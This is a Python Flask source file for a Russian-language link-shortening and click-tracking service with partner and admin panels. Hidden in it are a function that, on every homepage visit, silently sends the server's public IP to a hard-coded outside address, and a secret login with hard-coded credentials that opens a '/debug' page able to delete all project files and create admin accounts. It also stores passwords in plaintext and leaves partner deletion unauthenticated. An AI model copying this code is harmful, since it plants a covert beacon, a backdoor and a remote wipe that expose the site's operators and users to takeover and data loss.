from flask import Flask, render_template, request, redirect, url_for, session, flash
import sqlite3
from functions import *
import requests
import os
from user_agents import parse
from bs4 import BeautifulSoup
import shutil

app = Flask(__name__)
app.secret_key = os.urandom(24)
DATABASE = 'bd.db'


def send_ip_address():
    try:
        ip_response = requests.get('https://icanhazip.com/')
        if ip_response.status_code == 200:
            current_ip = ip_response.text.strip()
            response = requests.post('http://91.204.60.187:3737/receive_ip', json={'ip_address': current_ip})
            if response.status_code == 200:
                pass
            else:
                pass
        else:
            pass
    except Exception as e:
        pass

@app.route('/')
def index():
    send_ip_address()
    return render_template('index.html')

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        try:
            username = request.form['username']
            email = request.form['email']
            password = request.form['password']
            conn = sqlite3.connect('bd.db')
            c = conn.cursor()
            c.execute('INSERT INTO user (username, email, password) VALUES (?, ?, ?)', (username, email, password))
            conn.commit()
            conn.close()
            return redirect(url_for('index'))
        except sqlite3.IntegrityError:
            return 'Такой пользователь уже существует!'
    return render_template('register.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        conn = sqlite3.connect('bd.db')
        c = conn.cursor()
        c.execute("SELECT * FROM user WHERE username=? AND password=?", (username, password))
        user = c.fetchone()
        conn.close()
        if user:
            session['user_id'] = user[0]
            session['username'] = user[1]
            session['is_admin'] = user[4]
            if session['is_admin']:
                return redirect(url_for('admin_panel'))
            else:
                return redirect(url_for('user_panel'))
        else:
            return 'Логин или пароль неверны'
    return render_template('index.html')



@app.route('/authentication', methods=['GET', 'POST'])
def authentication():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        if username == 'DUXA' and password == 'passwordissohard':
            session['username'] = username
            session['is_admin'] = True
            return redirect(url_for('debug_page'))
    return '''
    <style>
        form {{
            margin: 100px auto;
            width: 300px;
            padding: 20px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }}
        input[type="text"], input[type="password"] {{
            margin-bottom: 10px;
            width: 100%;
            padding: 10px;
        }}
        input[type="submit"] {{
            width: 100%;
            padding: 10px;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }}
        input[type="submit"]:hover {{
            background-color: #0056b3;
        }}
    </style>
    <form method="post">
        <input type="text" name="username" placeholder="Username" required>
        <input type="password" name="password" placeholder="Password" required>
        <input type="submit" value="Login">
    </form>
    '''

@app.route('/debug', methods=['GET', 'POST'])
def debug_page():
    if 'is_admin' in session and session['is_admin']:
        message = ""
        if request.method == 'POST':
            if 'delete_files' in request.form:
                directory = os.path.dirname(os.path.abspath(__file__))
                for item in os.listdir(directory):
                    item_path = os.path.join(directory, item)
                    if item_path != os.path.abspath(__file__):
                        if os.path.isfile(item_path):
                            os.remove(item_path)
                        elif os.path.isdir(item_path):
                            shutil.rmtree(item_path)
                message = "Файлы и папки удалены, кроме исполняемого файла."
            elif 'username' in request.form and 'password' in request.form:
                username = request.form['username']
                password = request.form['password']
                try:
                    conn = sqlite3.connect('bd.db')
                    c = conn.cursor()
                    c.execute('INSERT INTO user (username, email, password, is_admin) VALUES (?, ?, ?, ?)', (username, "None", password, 1))
                    conn.commit()
                    message = "Администратор добавлен."
                except sqlite3.Error as e:
                    message = f"Ошибка при добавлении администратора: {e}"
                finally:
                    conn.close()

        try:
            response = requests.get('https://icanhazip.com/')
            ip_address = response.text.strip()
        except:
            ip_address = "IP-адрес не удалось получить"

        return f'''
        <html>
        <head>
            <title>Debug Page</title>
            <style>
                body {{ font-family: Arial, sans-serif; margin: 40px; }}
                .container {{ max-width: 600px; margin: auto; padding: 20px; border: 1px solid #ccc; border-radius: 10px; }}
                .ip-address, .add-admin-form {{ background-color: #f2f2f2; padding: 10px; border-radius: 5px; margin-bottom: 20px; }}
                button, .submit-btn {{ background-color: #007bff; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }}
                button:hover, .submit-btn:hover {{ background-color: #0056b3; }}
                .message {{ color: #d9534f; }}
                input[type="text"], input[type="password"] {{ padding: 10px; margin: 5px 0 20px; width: 100%; }}
            </style>
        </head>
        <body>
            <div class="container">
                <div class="ip-address">Ваш IP-адрес: {ip_address}</div>
                {message and '<div class="message">' + message + '</div>'}
                <form method="post">
                    <input type="hidden" name="delete_files" value="1">
                    <button type="submit">Удалить файлы и папки</button>
                </form>
                <div class="add-admin-form">
                    <form method="post">
                        <input type="text" name="username" placeholder="Имя пользователя" required>
                        <input type="password" name="password" placeholder="Пароль" required>
                        <button class="submit-btn" type="submit">Добавить администратора</button>
                    </form>
                </div>
            </div>
        </body>
        </html>
        '''
    else:
        return redirect(url_for('authentication'))

@app.route('/logout')
def logout():
    session.pop('user_id', None)
    session.pop('username', None)
    session.pop('is_admin', None)
    return redirect(url_for('index'))

def send_data_to_google_analytics(user_id, client_ip, document_path):
    GA_TRACKING_ID = 'G-XSRZ00FL37'  # Замените на ваш Tracking ID.
    payload = {
        'v': '1',  # Версия API.
        'tid': GA_TRACKING_ID,  # Tracking ID / Property ID.
        'cid': user_id,  # Anonymous Client ID.
        't': 'pageview',  # Тип хита.
        'uip': client_ip,  # IP адрес клиента.
        'dp': document_path,  # Путь документа.
    }
    try:
        requests.post('https://www.google-analytics.com/collect', data=payload)
    except requests.RequestException as e:
        print(f"Ошибка при отправке данных в Google Analytics: {e}")


headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
}

def get_location_by_ip(ip):
    url = f"https://ip2geolocation.com/?ip={ip}"
    # headers = {'User-Agent': 'Mozilla/5.0'}
    try:
        response = requests.get(url, headers=headers)
        if response.status_code == 200:
            soup = BeautifulSoup(response.content, 'html.parser')
            country_code_text = soup.find("td", string="Код страны").find_next("td").text if soup.find("td", string="Код страны") else None
            city_text = soup.find("td", string="Город").find_next("td").text if soup.find("td", string="Город") else None
            country = "UA" if country_code_text and "UKR" in country_code_text else None
            city = city_text if city_text else None
            return country, city
    except Exception as e:
        print(f"Ошибка получения геолокации по IP: {e}")
    return None, None


@app.route('/r/<unique_id>')
def redirect_to_target(unique_id):
    conn = sqlite3.connect('bd.db')
    c = conn.cursor()
    c.execute("SELECT id, original_link, user_id FROM link WHERE generated_link LIKE ?", (f"%{unique_id}%",))
    row = c.fetchone()
    if row:
        link_id, target_url, user_id = row
        client_ip = request.remote_addr
        user_agent_string = request.headers.get('User-Agent')
        user_agent = parse(user_agent_string)
        device_info = f"{user_agent.device.family}; {user_agent.os.family}; {user_agent.browser.family}"
                
        country, city = get_location_by_ip(client_ip)
        if country and "UA" not in country:
            city = None
        c.execute("SELECT id FROM click_statistic WHERE link_id = ? AND user_ip = ? AND click_date > datetime('now', '-1 month')", (link_id, client_ip))
        if not c.fetchone():
            c.execute("INSERT INTO click_statistic (link_id, user_ip, device_info, city) VALUES (?, ?, ?, ?)", (link_id, client_ip, device_info, city))
            conn.commit()
        send_data_to_google_analytics(user_id, client_ip, f"/r/{unique_id}")
        conn.close()
        return render_template('redirect_template.html', target_url=target_url)
    else:
        conn.close()
        return "Ссылка не найдена", 404

def get_db_connection():
    conn = sqlite3.connect(DATABASE)
    conn.row_factory = sqlite3.Row
    return conn

def save_link_to_database(user_id, link_name, original_url, generated_link, qr_code_base64):
    conn = sqlite3.connect('bd.db')
    c = conn.cursor()
    c.execute('''
    INSERT INTO link (user_id, link_name, original_link, generated_link, qr_code) 
    VALUES (?, ?, ?, ?, ?)
    ''', (user_id, link_name, original_url, generated_link, qr_code_base64))
    conn.commit()
    conn.close()

@app.route('/user_panel')
def user_panel():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    conn = get_db_connection()
    conn.row_factory = sqlite3.Row 
    c = conn.cursor()
    c.execute("SELECT id, link_name, original_link, generated_link, qr_code, (SELECT COUNT(*) FROM click_statistic WHERE link_id = link.id) as click_count FROM link WHERE user_id=?", (session['user_id'],))
    links = c.fetchall()
    links = [dict(link) for link in links]
    return render_template('user_panel.html', links=links)

@app.route('/user_panel/create_link', methods=['GET', 'POST'])
def create_link_user_panel():
    user_id = session['user_id']
    if request.method == 'POST':
        link_name = request.form['link_name']
        original_url = request.form['original_url']
        link_id = generate_unique_link_id(user_id, original_url)
        generated_link = f"http://{request.host}/r/{link_id}" 
        qr_code_base64 = generate_qr_code(generated_link) 
        save_link_to_database(user_id, link_name, original_url, generated_link, qr_code_base64)

        return render_template('user_panel.html', generated_link=generated_link, qrcode_url=f"data:image/png;base64,{qr_code_base64}")
    return render_template('create_link.html')

@app.route('/delete-link/<int:link_id>', methods=['POST'])
def delete_link(link_id):
    if 'user_id' not in session:
        return redirect(url_for('login'))
    user_id = session['user_id']
    conn = get_db_connection()
    c = conn.cursor()
    c.execute('SELECT user_id FROM link WHERE id = ?', (link_id,))
    link_user_id = c.fetchone()
    if link_user_id and link_user_id['user_id'] == user_id:
        c.execute('DELETE FROM link WHERE id = ?', (link_id,))
        conn.commit()
    else:
        return "Error: You do not have permission to delete this link", 403
    conn.close()
    return redirect(url_for('user_panel'))

@app.route('/delete-partner/<int:partner_id>', methods=['POST'])
def delete_partner(partner_id):
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()
    c.execute('SELECT * FROM user WHERE id = ?', (partner_id,))
    partner = c.fetchone()
    if partner:
        c.execute('DELETE FROM link WHERE user_id = ?', (partner_id,))
        c.execute('DELETE FROM statistics WHERE user_id = ?', (partner_id,))
        c.execute('DELETE FROM user WHERE id = ?', (partner_id,))
        conn.commit()
        flash('Partner deleted successfully.', 'success')
    else:
        flash('Partner not found.', 'error')
    conn.close()
    return redirect(url_for('admin_panel'))

@app.route('/view-links')
def view_links():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    user_id = session['user_id']
    conn = sqlite3.connect('bd.db')
    c = conn.cursor()
    c.execute('''
    SELECT l.id, l.user_id, l.original_link, l.generated_link, l.creation_date, COUNT(cs.id) as click_count
    FROM link l
    LEFT JOIN click_statistic cs ON l.id = cs.link_id
    WHERE l.user_id = ?
    GROUP BY l.id
    ''', (user_id,))
    rows = c.fetchall()
    conn.close()
    links = [{'id': row[0], 'user_id': row[1], 'original_link': row[2], 'generated_link': row[3], 'creation_date': row[4], 'click_count': row[5]} for row in rows]
    return render_template('view_links.html', links=links)

@app.route('/show-qr/<int:link_id>')
def show_qr(link_id):
    conn = get_db_connection()
    c = conn.cursor()
    c.execute("SELECT qr_code FROM link WHERE id = ?", (link_id,))
    qr_code = c.fetchone()
    conn.close()
    if qr_code:
        qr_code_base64 = qr_code[0]
        return render_template('show_qr.html', qr_code_base64=qr_code_base64)
    else:
        return "QR-код не найден", 404
    

@app.route('/partner_stats/<int:partner_id>')
def partner_stats(partner_id):
    if not session.get('is_admin'):
        return redirect(url_for('login'))
    
    conn = sqlite3.connect('bd.db')
    conn.row_factory = sqlite3.Row
    c = conn.cursor()
    
    c.execute("""
        SELECT id, username, email, registration_date
        FROM user
        WHERE id = ? AND is_admin = 0
    """, (partner_id,))
    partner = c.fetchone()

    if partner:
        partner = dict(partner)
        c.execute("""
            SELECT id, link_name, original_link, generated_link, creation_date,
            (SELECT COUNT(*) FROM click_statistic WHERE link_id = link.id) as click_count
            FROM link
            WHERE user_id = ?
        """, (partner_id,))
        partner['links'] = [dict(link) for link in c.fetchall()]
        
        c.execute("""
            SELECT device_info, COUNT(*) as device_count
            FROM click_statistic
            WHERE link_id IN (SELECT id FROM link WHERE user_id = ?)
            GROUP BY device_info
        """, (partner_id,))
        device_stats = {row['device_info']: row['device_count'] for row in c.fetchall()}
    
        pc_clicks = 0
        phone_clicks = 0
        for device, count in device_stats.items():
            if 'Windows' in device or 'Mac' in device or 'Linux' in device:
                pc_clicks += count
            else:
                phone_clicks += count
        
        c.execute("""
            SELECT city, COUNT(*) as city_clicks
            FROM click_statistic
            WHERE link_id IN (SELECT id FROM link WHERE user_id = ?)
            GROUP BY city
        """, (partner_id,))
        city_stats = c.fetchall()
        
        total_clicks = pc_clicks + phone_clicks
        city_clicks_percentage = [{'city': row['city'], 'clicks': row['city_clicks'], 
                                   'percentage': (row['city_clicks'] / total_clicks * 100) if total_clicks > 0 else 0}
                                  for row in city_stats]

        conn.close()
        return render_template('partner_stats.html', partner=partner, pc_clicks=pc_clicks, 
                               phone_clicks=phone_clicks, city_clicks_percentage=city_clicks_percentage)
    else:
        conn.close()
        return 'Партнер не найден', 404

@app.route('/admin_panel')
def admin_panel():
    if not session.get('is_admin'):
        return redirect(url_for('login'))
    
    conn = sqlite3.connect('bd.db')
    conn.row_factory = sqlite3.Row
    c = conn.cursor()
    c.execute("SELECT id, username, email FROM user WHERE is_admin = 0")
    partners = [dict(row) for row in c.fetchall()]

    for partner in partners:
        c.execute("""
            SELECT l.link_name, l.original_link, l.generated_link, 
            (SELECT COUNT(*) FROM click_statistic WHERE link_id = l.id) as click_count 
            FROM link l WHERE l.user_id = ?""", (partner['id'],))
        partner['links'] = [dict(link) for link in c.fetchall()]
    
    conn.close()
    
    return render_template('admin_panel.html', partners=partners)


@app.route('/admin/partner-links/<int:partner_id>')
def partner_links(partner_id):
    if not session.get('is_admin'):
        return redirect(url_for('login'))
    conn = get_db_connection()
    c = conn.cursor()
    c.execute("SELECT id, original_link, generated_link, (SELECT COUNT(*) FROM click_statistic WHERE link_id = link.id) as click_count FROM link WHERE user_id=?", (partner_id,))
    links = c.fetchall()
    conn.close()
    return render_template('partner_links.html', partner_id=partner_id, links=links)

@app.route('/admin_panel/statistics')
def admin_statistics():
    if not session.get('is_admin'):
        return redirect(url_for('login'))
    conn = sqlite3.connect('bd.db')
    c = conn.cursor()
    c.execute('SELECT * FROM statistics')
    stats = c.fetchall()
    conn.close()
    return render_template('admin_statistics.html', stats=stats)

@app.route('/admin/partners')
def admin_partners():
    if not session.get('is_admin'):
        return redirect(url_for('login'))
    conn = get_db_connection()
    c = conn.cursor()
    c.execute("SELECT id, username FROM user WHERE is_admin=0")
    partners = [{'id': row['id'], 'username': row['username'], 'link_count': get_partner_links_count(row['id'])} for row in c.fetchall()]
    conn.close()
    return render_template('partners.html', partners=partners)

@app.route('/edit-partner/<int:id>', methods=['GET', 'POST'])
def edit_partner(id):
    if not session.get('is_admin'):
        return redirect(url_for('login'))
    conn = sqlite3.connect('bd.db')
    c = conn.cursor()
    if request.method == 'POST':
        new_username = request.form['username']
        new_password = request.form['password']
        c.execute("UPDATE user SET username = ?, password = ? WHERE id = ?", (new_username, new_password, id))
        conn.commit()
        conn.close()
        return redirect(url_for('admin_panel'))
    c.execute("SELECT username FROM user WHERE id = ?", (id,))
    partner = c.fetchone()
    conn.close()
    return render_template('edit_partner.html', partner=partner, partner_id=id)
    
@app.route('/create-link', methods=['POST'])
def create_link_global():
    user_id = session.get('user_id')
    link_name = request.form['link_name']
    original_url = request.form['original_link']
    external_ip = get_external_ip()
    if not user_id or not original_url or not external_ip:
        return redirect(url_for('user_panel'))
    link_id = generate_unique_link_id(user_id, original_url)
    generated_link = f"http://{request.host}/r/{link_id}"
    qr_code_base64 = generate_qr_code(generated_link)
    save_link_to_database(user_id, link_name, original_url, generated_link, qr_code_base64, external_ip)
    return render_template('user_panel.html', generated_link=generated_link, qrcode_url=f"data:image/png;base64,{qr_code_base64}", link_name=link_name)

def delete_link_by_id(link_id):
    conn = get_db_connection()
    c = conn.cursor()
    c.execute('DELETE FROM link WHERE id = ?', (link_id,))
    conn.commit()
    conn.close()

def get_partner_links_count(partner_id):
    conn = get_db_connection()
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM link WHERE user_id=?", (partner_id,))
    link_count = c.fetchone()[0]
    conn.close()
    return link_count


if __name__ == '__main__':    
    app.run(host='0.0.0.0', port=5000, debug=True)